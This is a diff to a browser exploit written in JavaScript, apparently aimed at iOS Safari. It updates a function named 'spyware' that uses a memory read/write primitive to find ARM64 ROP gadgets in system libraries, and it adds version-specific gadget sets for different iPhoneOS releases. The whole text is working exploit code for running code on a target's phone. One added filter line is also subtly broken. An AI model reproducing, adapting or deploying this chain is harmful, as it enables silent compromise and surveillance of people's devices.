@@ -117,6 +117,7 @@ function _writeInt64(i, val)
 
 function spyware(stage1, memory, binary)
 {
+    alert('spyware!')
     var wrapper = document.createElement("div")
     var wrapper_addr = stage1.addrof(wrapper)
 
@@ -209,12 +210,40 @@ function spyware(stage1, memory, binary)
         "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
         "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   ["__ZN3JSC30endOfFixedExecutableMemoryPoolE"],
     };
-    var opcodes =
-    {
-        "regloader":   [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ],
-        "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
-        "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
-    };
+
+    var opcodes;
+    var opcode_libs;
+
+    if (/iPhoneOS 10_/.test(navigator.userAgent)) {
+        opcodes = {
+            // mov x0, x23; mov x1, x22; mov x2, x24; mov x3, x25; mov x4, x26; mov x5, x27; blr x28
+            "regloader":   [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ],
+            // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
+            "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
+            // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
+            // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
+            "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
+        };
+
+        opcode_libs = [ "/usr/lib/libLLVM.dylib" ];
+    } else {
+        opcodes = {
+            // ldr x8, [sp] ; str x8, [x19] ; ldp x29, x30, [sp, #0x20] ; ldp x20, x19, [sp, #0x10] ; add sp, sp, #0x30 ; ret
+            "ldrx8":       [0xf94003e8, 0xf9000268, 0xa9427bfd, 0xa9414ff4, 0x9100c3ff, 0xd65f03c0],
+            // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
+            "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
+            // mov x3, x22 ; mov x6, x27 ; mov x0, x24 ; mov x1, x19 ; mov x2, x23 ; ldr x4, [sp] ; blr x8
+            "regloader":   [ 0xaa1603e3, 0xaa1b03e6, 0xaa1803e0, 0xaa1303e1, 0xaa1703e2, 0xf94003e4, 0xd63f0100 ],
+            // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
+            // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
+            "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
+        }
+        opcode_libs = [
+            "/usr/lib/PN548.dylib",     // dispatch, stackloader
+            "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, stackloader
+        ];
+    }
+
     var syms = {};
     var gadgets = {};
     var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
@@ -227,7 +256,7 @@ function spyware(stage1, memory, binary)
             return memory.read(Add(straddr, i), 1)[0];
         };
         var base = Add(memory.readInt64(Add(imgs, i * 0x20)), cache_slide);
-        if(strcmp(fn, "/usr/lib/libLLVM.dylib"))
+        if(opcode_libs.some(lib => strcmp(fn, lib)))
         {
             var ncmds = memory.u32(Add(base, 0x10));
             for(var j = 0, off = 0x20; j < ncmds; ++j)
@@ -240,7 +269,8 @@ function spyware(stage1, memory, binary)
                     {
                         if(strcmp(memory.read(Add(base, o), 0x10), "__text"))
                         {
-                            var keys = Object.keys(opcodes);
+                            var keys = Object.keys(opcodes).filter(k=>!gadgets.hasOwnProperty[k])
+                            if (keys.length == 0) break;
                             var match = {};
                             for(var z = 0; z < keys.length; ++z)
                             {
@@ -251,7 +281,7 @@ function spyware(stage1, memory, binary)
                             var size = new Int64(b.slice(8, 16));
                             if(size.hi() != 0)
                             {
-                                fail("LLVM");
+                                fail("opcodes");
                             }
                             size = size.lo();
                             // This is a fucking monster region, need fast mem access for this shit
@@ -327,6 +357,7 @@ function spyware(stage1, memory, binary)
             fail(s);
         }
     }
+
     var longjmp             = syms["__longjmp"];
     var regloader           = gadgets["regloader"];
     var dispatch            = gadgets["dispatch"];
